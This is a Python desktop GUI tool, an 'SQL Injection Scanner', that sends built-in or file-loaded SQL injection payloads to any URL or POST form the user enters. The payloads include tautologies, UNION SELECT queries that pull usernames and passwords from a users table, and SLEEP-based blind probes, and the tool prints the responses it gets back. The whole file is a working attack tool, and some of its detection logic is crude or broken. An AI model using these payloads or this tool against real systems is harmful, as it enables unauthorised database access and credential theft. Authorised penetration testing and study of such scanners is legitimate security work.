import requests
import time
import urllib.parse
import threading
from tkinter import *
from tkinter import ttk, messagebox, filedialog
from typing import List, Dict, Tuple

# Default payloads
basic_payloads: List[str] = ["' OR '1'='1", "' OR 1=1 --", "' OR 'a'='a"]
extended_payloads: List[str] = [
    "' OR '1'='1",
    "'; EXECUTE IMMEDIATE 'SELECT USER'; --",
    "' OR '1'='1' UNION SELECT null, username || ':' || password FROM users --",
    "' AND EXISTS(SELECT * FROM users WHERE username = 'admin' AND password LIKE '%') --",
    "OR 1=1 --",
    "OR 'a'='a",
    "OR '1'='1' --",
    "OR 'a'='a' --",
    "OR 1=1 UNION SELECT null, username || ':' || password FROM users --",
    "OR '1'='1' UNION SELECT null, username || ':' || password FROM users --"
]

blind_payloads: List[str] = [
    "' AND SLEEP(5) --",
    "' AND SLEEP(10) --",
    "' AND SLEEP(15) --",
    "' AND SLEEP(20) --",
    "' AND SLEEP(30) --"
]

def load_payloads_from_file(file_path: str) -> List[str]:
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        messagebox.showerror("Error", f"The file {file_path} was not found.")
        return []

def scan_sql_injection(
    base_url: str,
    payloads: List[str],
    method: str,
    data: Dict[str, str] = None,
    cookies: Dict[str, str] = None
) -> List[Tuple[str, str, str]]:
    if not payloads:
        messagebox.showwarning("Warning", "No payloads to test.")
        return []

    if "=" not in base_url:
        messagebox.showwarning("Warning", "Example URL format: https://example.com/param=1")
        return []

    results: List[Tuple[str, str, str]] = []

    def test_payload(payload: str):
        parsed_url = urllib.parse.urlparse(base_url)
        query = parsed_url.query + urllib.parse.quote(payload)
        test_url = urllib.parse.urlunparse(parsed_url._replace(query=query))

        try:
            if method == 'get':
                response = requests.get(test_url, timeout=5, cookies=cookies)
            elif method == 'post':
                if data:
                    data_with_payload = {k: v + payload for k, v in data.items()}
                response = requests.post(base_url, data=data_with_payload, timeout=5, cookies=cookies)
            else:
                messagebox.showerror("Error", "Invalid method. Please use GET or POST.")
                return

            if response.status_code == 200:
                results.append((test_url, payload, response.text))
            time.sleep(2)  # Add a delay to avoid overwhelming the server
        except requests.exceptions.RequestException as e:
            messagebox.showerror("Request Error", f"Failed to make a request: {e}")

    threads: List[threading.Thread] = []
    for payload in payloads:
        t = threading.Thread(target=test_payload, args=(payload,))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    return results

def scan_blind_sql_injection(
    base_url: str,
    payloads: List[str],
    method: str,
    data: Dict[str, str] = None,
    cookies: Dict[str, str] = None
) -> List[Tuple[str, str, str]]:
    if not payloads:
        messagebox.showwarning("Warning", "No payloads to test.")
        return []

    if "=" not in base_url:
        messagebox.showwarning("Warning", "Example URL format: https://example.com/param=1")
        return []

    results: List[Tuple[str, str, str]] = []

    def test_payload(payload: str):
        parsed_url = urllib.parse.urlparse(base_url)
        query = parsed_url.query + urllib.parse.quote(payload)
        test_url = urllib.parse.urlunparse(parsed_url._replace(query=query))

        start_time = time.time()
        try:
            if method == 'get':
                response = requests.get(test_url, timeout=30, cookies=cookies)
            elif method == 'post':
                if data:
                    data_with_payload = {k: v + payload for k, v in data.items()}
                response = requests.post(base_url, data=data_with_payload, timeout=30, cookies=cookies)
            else:
                messagebox.showerror("Error", "Invalid method. Please use GET or POST.")
                return

            end_time = time.time()
            if response.status_code == 200 and end_time - start_time > 20:
                results.append((test_url, payload, response.text))
            time.sleep(2)  # Add a delay to avoid overwhelming the server
        except requests.exceptions.RequestException as e:
            messagebox.showerror("Request Error", f"Failed to make a request: {e}")

    threads: List[threading.Thread] = []
    for payload in payloads:
        t = threading.Thread(target=test_payload, args=(payload,))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    return results

def scan_blind_sql_injection_union(
    base_url: str,
    payloads: List[str],
    method: str,
    data: Dict[str, str] = None,
    cookies: Dict[str, str] = None
) -> List[Tuple[str, str, str]]:
    if not payloads:
        messagebox.showwarning("Warning", "No payloads to test.")
        return []

    if "=" not in base_url:
        messagebox.showwarning("Warning", "Example URL format: https://example.com/param=1")
        return []

    results: List[Tuple[str, str, str]] = []

    def test_payload(payload: str):
        parsed_url = urllib.parse.urlparse(base_url)
        query = parsed_url.query + urllib.parse.quote(payload)
        test_url = urllib.parse.urlunparse(parsed_url._replace(query=query))

        try:
            if method == 'get':
                response = requests.get(test_url, timeout=30, cookies=cookies)
            elif method == 'post':
                if data:
                    data_with_payload = {k: v + payload for k, v in data.items()}
                response = requests.post(base_url, data=data_with_payload, timeout=30, cookies=cookies)
            else:
                messagebox.showerror("Error", "Invalid method. Please use GET or POST.")
                return

            if "SELECT * FROM" in response.text:
                results.append((test_url, payload, response.text))
            time.sleep(2)  # Add a delay to avoid overwhelming the server
        except requests.exceptions.RequestException as e:
            messagebox.showerror("Request Error", f"Failed to make a request: {e}")

    threads: List[threading.Thread] = []
    for payload in payloads:
        t = threading.Thread(target=test_payload, args=(payload,))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    return results

class SQLInjectorApp:
    def __init__(self, root):
        self.root = root
        self.root.title("SQL Injection Scanner")

        self.create_widgets()

    def create_widgets(self):
        # URL
        self.url_label = Label(self.root, text="Base URL (with parameter):")
        self.url_label.grid(row=0, column=0, sticky=E, padx=5, pady=5)
        self.url_entry = Entry(self.root, width=50)
        self.url_entry.grid(row=0, column=1, padx=5, pady=5)

        # Method
        self.method_label = Label(self.root, text="Request Method:")
        self.method_label.grid(row=1, column=0, sticky=E, padx=5, pady=5)
        self.method_var = StringVar()
        self.method_combobox = ttk.Combobox(self.root, textvariable=self.method_var, values=["GET", "POST"])
        self.method_combobox.grid(row=1, column=1, padx=5, pady=5)
        self.method_combobox.current(0)

        # POST Data
        self.data_label = Label(self.root, text="POST Data (key=value&key2=value2):")
        self.data_label.grid(row=2, column=0, sticky=E, padx=5, pady=5)
        self.data_entry = Entry(self.root, width=50)
        self.data_entry.grid(row=2, column=1, padx=5, pady=5)

        # Cookies
        self.cookies_label = Label(self.root, text="Cookies (key=value; key2=value2):")
        self.cookies_label.grid(row=3, column=0, sticky=E, padx=5, pady=5)
        self.cookies_entry = Entry(self.root, width=50)
        self.cookies_entry.grid(row=3, column=1, padx=5, pady=5)

        # Payloads File
        self.payloads_label = Label(self.root, text="Payloads File:")
        self.payloads_label.grid(row=4, column=0, sticky=E, padx=5, pady=5)
        self.payloads_entry = Entry(self.root, width=50)
        self.payloads_entry.grid(row=4, column=1, padx=5, pady=5)
        self.payloads_button = Button(self.root, text="Browse", command=self.browse_file)
        self.payloads_button.grid(row=4, column=2, padx=5, pady=5)

        # Scan Type
        self.scan_label = Label(self.root, text="Scan Type:")
        self.scan_label.grid(row=5, column=0, sticky=E, padx=5, pady=5)
        self.sql_injection_var = IntVar()
        self.blind_sql_injection_var = IntVar()
        self.blind_sql_injection_union_var = IntVar()
        self.sql_injection_check = Checkbutton(self.root, text="SQL Injection", variable=self.sql_injection_var)
        self.sql_injection_check.grid(row=5, column=1, sticky=W)
        self.blind_sql_injection_check = Checkbutton(self.root, text="Blind SQL Injection", variable=self.blind_sql_injection_var)
        self.blind_sql_injection_check.grid(row=6, column=1, sticky=W)
        self.blind_sql_injection_union_check = Checkbutton(self.root, text="Blind SQL Injection (Union)", variable=self.blind_sql_injection_union_var)
        self.blind_sql_injection_union_check.grid(row=7, column=1, sticky=W)

        # Scan Button
        self.scan_button = Button(self.root, text="Scan", command=self.scan)
        self.scan_button.grid(row=8, column=1, pady=10)

        # Results
        self.results_text = Text(self.root, wrap=WORD, width=70, height=20)
        self.results_text.grid(row=9, column=0, columnspan=3, padx=5, pady=5)

    def browse_file(self):
        file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if file_path:
            self.payloads_entry.delete(0, END)
            self.payloads_entry.insert(0, file_path)

    def scan(self):
        url = self.url_entry.get()
        method = self.method_var.get().lower()
        data = dict(urllib.parse.parse_qsl(self.data_entry.get())) if self.data_entry.get() else None
        cookies = dict(item.split('=') for item in self.cookies_entry.get().split('; ')) if self.cookies_entry.get() else None
        payloads_file = self.payloads_entry.get()

        payloads = load_payloads_from_file(payloads_file) if payloads_file else basic_payloads

        self.results_text.delete(1.0, END)
        if self.sql_injection_var.get():
            results = scan_sql_injection(url, payloads, method, data, cookies)
            self.display_results(results)

        if self.blind_sql_injection_var.get():
            results = scan_blind_sql_injection(url, payloads, method, data, cookies)
            self.display_results(results)

        if self.blind_sql_injection_union_var.get():
            results = scan_blind_sql_injection_union(url, payloads, method, data, cookies)
            self.display_results(results)

        if not self.sql_injection_var.get() and not self.blind_sql_injection_var.get() and not self.blind_sql_injection_union_var.get():
            messagebox.showerror("Error", "No scan type selected. Please select at least one scan type.")

    def display_results(self, results: List[Tuple[str, str, str]]):
        if results:
            self.results_text.insert(END, "Vulnerabilities found:\n")
            for result in results:
                self.results_text.insert(END, f"URL: {result[0]}\n")
                self.results_text.insert(END, f"Payload: {result[1]}\n")
                self.results_text.insert(END, f"Response: {result[2]}\n\n")
        else:
            self.results_text.insert(END, "No vulnerabilities found.\n")

if __name__ == "__main__":
    root = Tk()
    app = SQLInjectorApp(root)
    root.mainloop()
